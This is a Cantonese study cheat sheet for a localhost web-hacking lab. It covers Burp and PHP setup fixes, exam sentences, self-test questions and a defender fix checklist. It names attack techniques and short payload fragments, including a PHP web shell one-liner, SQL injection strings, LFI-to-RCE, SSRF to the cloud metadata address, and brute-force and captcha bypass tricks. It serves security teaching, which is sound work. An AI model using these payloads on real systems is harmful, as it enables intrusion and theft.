| 去 `http://localhost:8080` 開到靶場，但 Burp HTTP history 冇紀錄 | FoxyProxy 未啟用 Burp profile，或 Firefox 對 localhost 繞過代理 | 確認 FoxyProxy 選中 `Burp`；必要時喺 Firefox 排除清單移除 localhost／強制經代理 |
| 開 `http://burpsuite` 一片空白／連唔到 | Intercept 未開、或流量冇經 Burp | 開 `Proxy > Intercept`；確認代理指向 `127.0.0.1:8080` |
| HTTPS 彈憑證警告（`SEC_ERROR_UNKNOWN_ISSUER`／`Your connection is not private`） | Burp CA（`cacert.der`／PortSwigger CA）未 import | Firefox View Certificates → Authorities → Import → 剔 Trust this CA to identify websites |
| `php -S` 起唔到：`Address already in use`／`bind failed` | port 8080 被佔（例如 Burp 已用 8080） | 換 port 或關掉佔用進程（本 lab 刻意讓 server 同 Burp 都用 8080，留意時序） |
| Burp 收唔到 §13／§14「自己叫自己」嘅 request，app 卡死 | PHP 內建 server 單執行緒，self-referential 請求 deadlock | 起靶場時一定要 `PHP_CLI_SERVER_WORKERS=12` |
| 攔截咗但 app 唔郁 | Intercept 開住唔放行 | 按 Forward／關 Intercept（一般設定好後熄 Intercept） |

**新手排查步驟（環境）**：① 靶場有無 `PHP 8.x Development Server … started`？② FoxyProxy 有無剔 Burp？③ Burp listener 是否 `127.0.0.1:8080` Running？④ `http://burpsuite` 收唔收到 CA 頁？⑤ CA 有無出現在 Authorities 並已信任？

### 4.2 偵察／命令類（§8，`ART_T3_02`）

| 卡點／Error | 成因 | Fix |
|---|---|---|
| `grep` 冇 output | 大小寫或引號問題 | 先 `grep -i`；含點嘅網域用單引號 `grep 'hkgov-service.local'` |
| `awk` 出 `443:mary.wong` 而唔係 `mary.wong:Passw0rd!` | 原行帶咗 URL scheme（`https://`），欄位向後移一格 | 先剝走 scheme 再抽，或改抽正確欄位（原文已明講） |
| 打開 `/api/users.php` 見 HTML 登入頁／302 | 環境未起好、路徑錯、host/port 錯 | 用 `http://localhost:8080`；確認 VM 起咗、port 8080 有聽 |
| `python3 tools/brute.py` 冇反應／報錯 | 唔喺 lab root 執行 | 一定要喺 lab folder 執行（腳本用相對路徑） |

### 4.3 認證／自動化濫用類（§1／§2／§6，`ART_T3_03`）

| 卡點／Error | 成因 | Fix |
|---|---|---|
| 搵唔到 hidden field | 只睇 render 出嚟嘅頁 | 用 `View page source`／`view-source:`，`Ctrl+F` 搜 `captcha_answer`、`hidden`、`DEBUG` |
| 填咗洩漏答案都話錯 | 答案每次載入重新生成 | 要喺**同一次載入**讀答案同提交；reload 咗就變 |
| Repeater 送出但 body 唔啱 | Content-Type／body 格式錯 | Content-Type 要 `application/x-www-form-urlencoded`；body 係 `key=value&key=value`；`captcha=bypass` 唔好加空格 |
| 瀏覽器撳唔到 Send Reset 按鈕 | 前端 JS 禁用＋倒數 | 唔好死喺灰色按鈕，喺 Burp Repeater／curl／Postman 重播 POST |
| Intruder 一堆 request 但收唔到 email | payload position 錯／睇錯收件位置 | 唯一 position 要喺 `email=`；去 `http://localhost:8080/webmail.php` 或 `http://localhost:8081` 睇 |
| 分號清單只寄一封 | 地址之間有空格 | 寫 `a@x.com;b@x.com`，**無空格** |
| 刪咗 Cookie 仲見鎖定 | 喺瀏覽器清 cookie 又即刻攞返新 cookie | 要喺 Repeater 逐次手動刪 `Cookie:` 行，真正**唔帶** cookie |
| 唔知邊個用戶名有效 | 差異化錯誤 | `Username not found.` vs `Password incorrect.`；或 `/forgot.php` 換 `username=` 參數 |
| 唔知 Intruder attack type | 兩個 payload 位置 | 用 **Cluster bomb**（單位置才用 Sniper） |
| 點睇結果邊行成功 | 只看 200 會錯 | 成功係 **302（轉去 `/index.php`）且長度唔同**；用 length 欄 sort |

### 4.4 注入類（§4／§12／§13，`ART_T3_04`）

| 卡點／Error | 成因 | Fix |
|---|---|---|
| Burp 收唔到 request（localhost） | Firefox 對 localhost 繞過系統代理 | FoxyProxy 強制，或排除清單移除 localhost |
| payload 編碼問題 | JSON 雙引號／URL 空格 | JSON 單引號唔使 escape、雙引號要 `\"`；URL 空格 `%20`、tab `%09` |
| Send 完回應唔合理 | `Content-Type` 冇設或設錯 | JSON code path **只有** `Content-Type: application/json` 才走 |
| Blind 版本變語法錯 | 引號數目唔平衡 | `OR '1'='1` 結尾**故意唔封最後引號**，等程式收尾；數清有幾個 `'` |
| sqlmap 撞唔入 | 注入點非標準＋自訂 filter＋統一 401 | 改用手工布林式 blind，讀 200 vs 401 差異，逐位 `substr()` 抽取 |

### 4.5 權限提升／憑證蒐集類（§3／§9，`ART_T3_05`、`ART_T3_06`）

| 卡點／Error | 成因 | Fix |
|---|---|---|
| 盲撞、唔先 fingerprint | 用錯技術棧 wordlist | 先睇 `Server`／`X-Powered-By`，再揀對應備份 pattern |
| Burp/ZAP 收唔到 request | proxy／CA 未設好 | 跟 §0 重做 proxy ＋ CA import |
| 只睇 status code 就落結論 | 有「軟 404」（200 回錯誤頁） | 三樣一齊比：200 ＋ body length 明顯唔同 ＋ content-type 合理 |
| 撞到 `.php.bak` 但瀏覽器空白 | 打漏咗 `.bak`，畀 PHP 執行 | 確認 URL 真係帶 `.bak`／`~` |
| 撞到 302 以為失敗 | 未登入時 302 = 路徑存在 | 用 302 vs 404 判斷存在；再用 leak＋JS 交叉比對用途 |

### 4.6 橫向檔案存取類（§5／§7／§10／§14，`ART_T3_07`）

| 卡點／Error | 成因 | Fix |
|---|---|---|
| 分唔清「真污染 cache」vs「本地 browser cache」 | 睇嘅係自己瀏覽器 | 開全新 private window（唔帶 header）去同一 URL；仍見毒連結＝真污染 |
| 以為 header XSS 會被前端驗證擋到 | 前端驗證只查表單欄位 | Burp 直接喺 header 落 payload，跳過整段網站 JS |
| `@file_get_contents()` 以為個 `@` 係防護 | 誤解運算子 | `@` 只抑制 PHP warning，**唔阻止任何嘢**，唔係防護 |
| LFI 讀得到但唔知點升 RCE | 忽略 `include` 會執行 PHP | `include()` 會執行載入檔內 PHP；可上傳／session／log poisoning 升級 |

### 4.7 主機淪陷類（§11，`ART_T3_08`）

| 卡點／Error | 成因 | Fix |
|---|---|---|
| 只答「LFI 讀到密碼就 root」 | 漏 steps | kill chain 要逐步 trace：LFI → 讀兩份備忘錄 → 重建密碼 → 讀 `/etc/passwd` 搵 UID 0 → SSH root |
| 唔知邊個係特權帳號 | 冇睇 `/etc/passwd` | 搵 UID 0，例 `root:x:0:0:root:/root:/bin/bash` |
| 唔明 keyboard-walk 為何易爆 | 誤以為「有符號就安全」 | 路徑可預測＋字典已收錄＋實際 entropy 極低 |

### 4.8 通用排查 5 步（卡住時照做）

1. **確認環境**：靶場 server 有冇跑？port 8080 有聽？FoxyProxy 有冇剔 Burp？Burp listener Running？
2. **確認路徑**：你打嘅 URL 帶唔帶正確副檔名／參數（`.bak`、`?lang=`、`Content-Type: application/json`）？
3. **確認訊號**：唔好淨睇 status code — 三樣一齊比（status code ＋ body length ＋ content-type）。
4. **做對照測試**：一正一反（`captcha=bypass` 成功 vs `captcha=wrong123` 失敗；真條件 200 vs 假條件 401）。
5. **搵權威來源**：效果唔喺你本機（email 去 webmail、登入去 `/profile.php`）；卡住就回查對應 guide 嘅「新手補充」章節。

**通用排查心法**：效果唔喺你本機——email 去 lab webmail 睇、登入去 `/profile.php` 確認、注入睇 response body 文字。做結論前一定要「一正一反」對照測試。

---

## Part 5：英文必背句 40 條（考試答題用）

1. "Open-Source Intelligence (OSINT) is information gathered from publicly available sources." — 公開來源情報係由公開來源蒐集嘅資訊。
2. "Exposing internal login identifiers halves the credential-guessing problem." — 洩露內部登入識別碼令憑證猜測問題砍一半。
3. "Every line is one saved credential in host:port:username:password format." — Stealer log 每行都係一條以 host:port:username:password 格式儲存嘅憑證。
4. "A complete credential pair is worth more than a thousand guessed usernames because it needs no guessing at all." — 一對完整憑證比一千個猜嘅用戶名更值錢，因為完全唔使猜。
5. "The page looks identical for every account, so one login cannot expose IDOR." — 頁面對每個帳號都一模一樣，所以單一登入揭發唔到 IDOR。
6. "Client-side controls are not security controls." — 前端控制唔係安全控制。
7. "The attacker controls both sides of the check." — 攻擊者控制檢查嘅兩邊。
8. "Its value depends entirely on server-side enforcement." — 一個驗證嘅價值完全取決於伺服器端強制執行。
9. "Each new HTTP request without a session cookie starts a fresh session." — 每個唔帶 session cookie 嘅新 HTTP request 都開一條新 session。
10. "The differing status and length reveal the valid pair instantly." — 唔同嘅狀態碼同長度即時揭示有效配對。
11. "An email bomb abuses an application's outbound resource-consuming function to flood a target or exhaust resources." — Email bomb 濫用應用嘅對外耗資源功能去淹沒目標或者耗盡資源。
12. "Email bombing is a messaging-layer denial-of-service attack, cataloged by MITRE as T1667 — Email Bombing under the Impact tactic." — Email bombing 係訊息層 DoS，MITRE 編為 T1667（Impact 戰術）。
13. "The transport format is irrelevant: JSON, XML, form data, headers, and cookies are all equally injectable if the value is concatenated into SQL." — 傳輸格式無關：只要值被拼接入 SQL，JSON、XML、表單、header、cookie 一樣可注入。
14. "SQL injection occurs when an application builds a database query by concatenating untrusted input directly into the SQL string." — SQL 注入發生於應用直接把未受信任輸入拼接入 SQL 字串去砌查詢。
15. "NoSQL injection is simply SQL injection translated into JSON: untrusted input becomes query logic instead of a data value." — NoSQL 注入只係 SQL 注入翻譯成 JSON：未受信任輸入變成查詢邏輯而非資料值。
16. "A keyword bad-list is at best a speed bump." — 關鍵字黑名單最多只係一個減速壆。
17. "The canonical defense is to use parameterized queries or ORM methods that treat user input as data values rather than query syntax." — 正解係用參數化查詢或 ORM，把用戶輸入當成資料值而唔係查詢語法。
18. "A larger result set for an operator payload versus a specific value indicates injection." — 用 operator payload 對比特定值會得到更大結果集，即表示有注入。
19. "The provider must only redirect codes to registered URIs; the relevant weakness is CWE-346 (Origin Validation Error)." — Provider 只可以將 code 重定向去已登記 URI；相關弱點係 CWE-346。
20. "If an edited redirect_uri still redirects with a valid code, no exact registered allow-list is enforced." — 如果改咗 redirect_uri 仲可以帶有效 code 重定向，即係冇強制 exact registered allow-list。
21. "Privilege escalation occurs when a user can perform actions or access resources beyond their authorized role." — 權限提升係當用戶可以執行超出其授權角色嘅動作或存取資源。
22. "Developers often treat an identifier as if it were a secret." — 開發者經常把識別碼當成秘密。
23. "A 302 only tells you that a path exists — it does not tell you what the path is actually for." — 302 只話你知路徑存在，唔代表你知道佢實際用途。
24. "A web shell is only code execution once you can browse to its URL." — Web shell 只有喺你可以瀏覽到佢 URL 嗰刻先算係代碼執行。
25. "The bottom line: privilege escalation is rooted in authorization failures." — 總結：權限提升根源在於授權失效。
26. "Backup artifacts left inside the web root — renamed configs, dumps, archives, and source-control metadata — are all reachable by anyone who guesses the predictable filenames." — 留喺 web root 內嘅備份檔——改名嘅 config、dump、壓縮檔同版本控制 metadata——任何估中可預測檔名嘅人都攞到。
27. "Directory listing may be disabled, but a wordlist of common backup and version-control paths is usually enough to find them." — 目錄列表可以係關咗，但一份常見備份／版本控制路徑嘅 wordlist 通常足以搵到佢哋。
28. "Fingerprint the stack first — Server headers, URL extensions, Wappalyzer — before building the wordlist." — 砌 wordlist 之前，先透過 Server header、URL 副檔名、Wappalyzer 指紋技術棧。
29. "Any HTTP 200 response means the file is directly downloadable." — 任何 HTTP 200 回應即代表該檔可直接下載。
30. "The entire repository history can usually be reconstructed from exposed Git metadata." — 暴露嘅 Git metadata 通常可以重構成個版本歷史。
31. "Web cache poisoning tricks the cache into storing a harmful response and serving it to other users who request the same URL." — Web cache poisoning 騙個 cache 儲存有害回應，再派畀請求同一 URL 嘅其他用戶。
32. "An unkeyed input is a request input that changes the response but is not included in the cache key." — Unkeyed input 係會改變回應但唔包含喺 cache key 內嘅請求輸入。
33. "Reflected header XSS occurs when markup smuggled in an HTTP header is echoed into the page without encoding, so the victim's browser executes it with the site's privileges." — Header 反射 XSS 係當藏喺 HTTP header 嘅標記未經編碼咁 echo 入頁面，令受害人瀏覽器以網站權限執行佢。
34. "Local File Inclusion occurs when an application loads a file based on user-supplied input without proper validation." — LFI 係當應用基於用戶輸入載入檔案而冇適當驗證。
35. "In PHP, include() executes any PHP code inside the loaded file." — 喺 PHP 度，include() 會執行載入檔案內任何 PHP 代碼。
36. "Server-Side Request Forgery (SSRF) occurs when an application accepts a URL from the user and then fetches that URL from the server." — SSRF 係當應用接受用戶提供嘅 URL，再由伺服器去 fetch 該 URL。
37. "Because the request originates from the server, it inherits the server's network position and level of trust." — 因為請求源自伺服器，佢繼承咗伺服器嘅網絡位置同信任級別。
38. "Without MFA on the privileged account, one guessed credential may grant full host control." — 特權帳號冇 MFA，一個估中嘅憑證就可能換嚟全主機控制。
39. "MITRE ATT&CK groups these techniques under TA0004 — Privilege Escalation; classic vectors include SUID abuse, sudo misconfiguration, and weak predictable credentials." — MITRE ATT&CK 把呢啲技術歸入 TA0004；經典向量包括 SUID 濫用、sudo 設定錯誤、弱可預測憑證。
40. "Results with different lengths or status codes usually reveal valid credentials." — 唔同長度或狀態碼嘅結果通常揭示有效憑證。

### Part 5 附：答題萬用句式（開頭／轉折）

- 定義題起手："X occurs when …"（例："SQL injection occurs when an application builds a database query by concatenating untrusted input directly into the SQL string."）
- 根因題："The root cause is a missing object-level authorization check."
- 對比題："<A> is classified as CWE-89, whereas <B> is CWE-943."
- 為何唔夠題："… is at best a speed bump."
- 防禦題："The canonical defense is to use parameterized queries that treat user input as data values."
- 伺服器端原則："Server-side enforcement is required because client-side controls can be bypassed."
- 判別題："A 302 only tells you that a path exists."
- 影響題："This enables reflected XSS, open redirects, and malicious script imports; the impact is multiplicative."
- 特權題："Without MFA on the privileged account, one guessed credential may grant full host control."
- 結論句："The bottom line: <one-sentence root cause>."

---

## Part 6：60 秒自測清單（38 條）

> 每題單行問句；答案指向對應 guide 檔名＋節號。原教程共 53 條 student questions，以下壓縮／篩選成 38 條高頻考點。

**公開偵察（`ART_T3_02`）**

1. OSINT 點解對攻擊者合法、低風險、又高槓桿？→ ART_T3_02 §4.1
2. 公開員工名錄點樣「halve the attacker's work」？連到 spraying／stuffing／phishing → ART_T3_02 §4.2
3. Stealer log 行格式係咩？點抽 username:password？→ ART_T3_02 §4.3
4. 欄位移位陷阱為何輸出 `443:mary.wong`？→ ART_T3_02 §4.6
5. IDOR 為何單靠一個帳號 expose 唔到？要點做先見到？→ ART_T3_02 §5
6. OSINT 屬 MITRE 邊個 tactic？對應邊四個技術編號？→ ART_T3_02 §8

**認證與自動化濫用（`ART_T3_03`）**

7. CAPTCHA 洩漏答案嘅兩個途徑係咩？→ ART_T3_03 §1
8. 為何「完全唔交 captcha 欄位」都註冊到？→ ART_T3_03 §1
9. Magic string backdoor 點用對照測試確認？→ ART_T3_03 §1
10. Email bomb 點用一個 request 觸發多封？→ ART_T3_03 §2
11. Delimiter injection 背後嘅錯誤假設係咩？→ ART_T3_03 §2
12. 為何綁 session cookie 嘅鎖定機制可以繞過？→ ART_T3_03 §6
13. 成功登入嗰行 Intruder 結果有咩特徵？→ ART_T3_03 §6
14. 明文／快 hash／慢 salted hash 存密碼分別喺邊？→ ART_T3_03 §6

**注入與 SSO（`ART_T3_04`）**

15. 為何送 JSON 唔會令 SQLi 消失？決定性因素係咩？→ ART_T3_04 §4
16. Blind SQLi 為何尾部用 `OR '1'='1` 而唔係 `--`？→ ART_T3_04 §4
17. Prepared statements 點中和 SQLi？為何黑名單／手動 escape 唔夠？→ ART_T3_04 §4
18. sqlmap 為何對呢類 endpoint 失效？人要點做？→ ART_T3_04 §4
19. NoSQL 同 SQLi 嘅共同根因係咩？→ ART_T3_04 §12
20. 邊啲 NoSQL payload shape 會回傳全表？為何？→ ART_T3_04 §12
21. OAuth redirect_uri allow-list 應保證咩？open redirect 點變 takeover？→ ART_T3_04 §13
22. Authorization code 做一次性＋短命嘅威脅模型係咩？→ ART_T3_04 §13
23. Token endpoint 兌換前要驗邊幾樣？→ ART_T3_04 §13
24. state 參數扮演咩角色？為何偷到 code 仲要新鮮 state？→ ART_T3_04 §13

**權限提升（`ART_T3_05`）**

25. IDOR 缺邊個 check？伺服器每次要驗乜？→ ART_T3_05 §4.2
26. 如何由 leak ＋ JS asset 樞到隱藏 admin endpoint？→ ART_T3_05 §4.7
27. 上載變成 RCE 要邊三個防禦同時失效？→ ART_T3_05 §4.8
28. 目錄掃描見 302 代表咩？唔代表咩？→ ART_T3_05 §4.6
29. `<?php echo system($_GET['cmd']); ?>` 兩部分分別做乜？→ ART_T3_05 §8.2

**憑證蒐集（`ART_T3_06`）**

30. 為何可預測備份檔名係最抵嘅發現？200 vs 404 判別作用？→ ART_T3_06 §4.4
31. 為何要先 fingerprint？被動訊號有邊啲？→ ART_T3_06 §4.4
32. 暴露 `.git` 比單一 config 備份值錢喺邊？→ ART_T3_06 §4.10
33. 為何「檔名難估」唔可以當 security control？→ ART_T3_06 §4.12

**橫向檔案存取（`ART_T3_07`）**

34. 定義 unkeyed input；邊啲 proxy header 有呢個特性？→ ART_T3_07 §4.1
35. Header 反射 XSS 為何前端表單驗證擋唔到？→ ART_T3_07 §4.2
36. LFI `../` 為何能逃逸？有咩 filter-evasion 技巧？→ ART_T3_07 §4.3
37. SSRF 為何繞過網路邊界？為何 `169.254.169.254` 最高價值？→ ART_T3_07 §4.4

**主機淪陷（`ART_T3_08`）**

38. Keyboard-walk 密碼為何滿足複雜度但極弱？由 LFI 到 root 嘅 kill chain 點行？→ ART_T3_08 §4.2／§4.1

---

## Part 7：防守方 30 秒修正清單

> 逐個漏洞一句修法。詳版見各 guide 嘅「🛡️ 防守方修正清單」章節。

| 漏洞 | 30 秒修法 |
|---|---|
| §1 CAPTCHA Bypass | 答案只存 server-side session，永不 render 落 HTML／hidden field／comment；缺失或空白一律拒；每次嘗試後重生成；加 per-IP rate limiting。 |
| §2 Email Bomb | 伺服器端 per-account／per-recipient／per-IP rate limit；只接受單一收件人、拒絕 `;` 等分隔符；地址去重；驗證地址所有權。 |
| §3 IDOR / BOLA | 每個收 ID 嘅 query 加 ownership 檢查（由 session 拎 user id 對比 owner），用統一授權層處理。 |
| §3 Broken function-level authorization | `/admin/` 底下每個 function 檢查 admin role（唔止 session）；default-deny；集中式 RBAC。 |
| §3 Unrestricted file upload | 伺服器端 extension allow-list ＋ MIME ＋ magic bytes；隨機 rename；存 web root 之外或停 uploads 目錄 script 執行。 |
| §4 SQL Injection | 一律 PDO／mysqli prepared statements ＋ bound parameters；回籠統錯誤；對登入 rate-limit。 |
| §5 Web Cache Poisoning | cache-key discipline——所有影響 response 嘅輸入入 cache key 或剝走；只 cache 靜態內容；永不靠客戶端可控 header 砌 URL。 |
| §6 Unlimited Brute Force | per-account 同 per-IP rate-limit／延遲（唔可以綁 session cookie）；通用錯誤訊息；bcrypt／Argon2；加 MFA。 |
| §7 Reflected XSS | 所有 request data（含 header）做 context-aware output encoding；設 restrictive CSP；cookie 標 HttpOnly。 |
| §8 OSINT / Username Leakage | 員工名錄同 API 全部收喺認證之後；login／reset 統一訊息；API 只回最小必要欄位；補 IDOR ownership 檢查。 |
| §9 Backup File Brute Force | 備份同版本控制 metadata 放 document root 外；加密敏感壓縮檔；輪替任何曾 commit 嘅秘密；server 層封 dotfile。 |
| §10 LFI via Language Loader | 永不拼用戶輸入入檔案路徑；用 allow-list＋`basename()`＋`realpath()` 確認；語言檔當資料讀（唔用 `include` 執行）。 |
| §11 Host Privilege Escalation | 特權帳號強制強、唯一密碼並拒 keyboard-walk／字典模式；管理員存取必須 MFA；內部政策文件移出任何 web 可讀路徑。 |
| §13 OAuth / SSO | redirect URI 完全一致匹配（冇 wildcard／prefix）；每 session 隨機 state；token endpoint 認 client；code 短命一次性；全 client PKCE（RFC 9700）。 |
| §14 SSRF | allow-list scheme（只 https）同域名；封私有／link-local（含 `169.254.169.254`）同 redirect；解析後驗證並 pin IP；停 `file://`；outbound 經隔離 egress proxy。 |
| 通用 PHP／部署 | `display_errors = Off`、`expose_php = Off`；DB 檔唔放 web root；`Options -Indexes`；設定 CSP 同 HTTP security headers。 |
| 通用主機 | 最小權限原則（Web server 只擁有業務所需權限）；PHP-FPM 專屬低權限用戶 pool；容器隔離（non-root／read-only FS）。 |
| 通用認證 | Rate limiting ＋ MFA（NIST SP 800-63B）；特權帳號密碼獨立唯一、不定期查 breach 清單；登入失敗與掃描行為做告警。 |

**防守 3 步自檢（每個 endpoint 問三次）**

1. **驗證**：呢個輸入有冇喺伺服器端檢查？（冇 = 前端控制，等於冇驗證）
2. **授權**：呢個動作有冇檢查「當前用戶」有冇權做／擁有？（唔止係有冇登入）
3. **資料分離**：用戶輸入有冇機會變成代碼／語法／路徑？（有 = 注入／traversal／SSRF 風險）

**修法優先次序（30 秒版）**

- 伺服器端驗證 ＞ 前端驗證
- allow-list ＞ deny-list
- 參數化查詢 ＞ escape ＞ 黑名單
- 存 Web root 外 ＞ 停 script 執行 ＞ 隨機改名
- 統一訊息／一致時間 ＞ 差異化錯誤

**一句總記**：所有漏洞嘅共同根因＝「**前端方便，唔等於後端安全**」；凡涉「驗證、限制、授權」嘅判斷，都要喺伺服器以「攻擊者控制唔到」嘅資料做基礎。

---

> **本檔完** — 涵蓋 Stage 0 ＋ 攻擊鏈六階段（§0–§14）累積速記：攻擊鏈總覽、逐節 payload、CWE／OWASP 對照、Error/Fix、英文必背句 40 條、自測 38 條、防守清單。詳細逐節解說見 `ART_T3_02`～`ART_T3_08` 各 Study Guide。
